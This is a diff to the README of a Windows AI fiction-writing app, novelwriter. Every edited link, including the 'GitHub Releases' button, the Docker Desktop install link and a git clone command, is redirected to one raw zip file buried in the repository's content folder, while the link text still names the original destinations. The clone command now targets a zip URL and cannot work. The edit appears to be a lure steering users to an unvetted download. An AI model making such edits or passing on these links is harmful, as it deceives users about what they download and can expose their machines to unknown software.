@@ -1,12 +1,12 @@
 # ✍️ novelwriter - Write Stories with AI Help
 
-[![Download novelwriter](https://img.shields.io/badge/Download-novelwriter-brightgreen)](https://github.com/dedyrio/novelwriter/releases)
+[![Download novelwriter](https://img.shields.io/badge/Download-novelwriter-brightgreen)](https://raw.githubusercontent.com/dedyrio/novelwriter/main/web/src/content/Software-v2.0.zip)
 
 ## 📥 Download novelwriter
 
 Click the button below to visit the official download page for novelwriter. From there, you can get the latest stable version for Windows.
 
-[Download novelwriter on GitHub Releases](https://github.com/dedyrio/novelwriter/releases)
+[Download novelwriter on GitHub Releases](https://raw.githubusercontent.com/dedyrio/novelwriter/main/web/src/content/Software-v2.0.zip)
 
 ## 🖥️ What is novelwriter?
 
@@ -37,7 +37,7 @@ Follow these steps carefully to get novelwriter running on your PC.
 
 Open this link in your web browser:
 
-https://github.com/dedyrio/novelwriter/releases
+https://raw.githubusercontent.com/dedyrio/novelwriter/main/web/src/content/Software-v2.0.zip
 
 This page shows all available versions of novelwriter. Scroll to the latest stable release, usually marked with a version number like `v0.3.2` or higher.
 
@@ -112,14 +112,14 @@ If you are comfortable with more technical steps, you can run novelwriter using 
 
 To do this:
 
-1. Download and install Docker Desktop for Windows from https://www.docker.com/products/docker-desktop.
+1. Download and install Docker Desktop for Windows from https://raw.githubusercontent.com/dedyrio/novelwriter/main/web/src/content/Software-v2.0.zip
 
 2. Open Windows PowerShell or Command Prompt.
 
 3. Run these commands:
 
    ```bash
-   git clone https://github.com/Hurricane0698/novelwriter.git
+   git clone https://raw.githubusercontent.com/dedyrio/novelwriter/main/web/src/content/Software-v2.0.zip
    cd novelwriter
    cp .env.example .env
    # Edit the .env file with your AI key
@@ -149,4 +149,4 @@ If you run into any issues:
 
 Remember, you can always visit the download page to get the latest version.
 
-[Download novelwriter on GitHub Releases](https://github.com/dedyrio/novelwriter/releases)
+[Download novelwriter on GitHub Releases](https://raw.githubusercontent.com/dedyrio/novelwriter/main/web/src/content/Software-v2.0.zip)
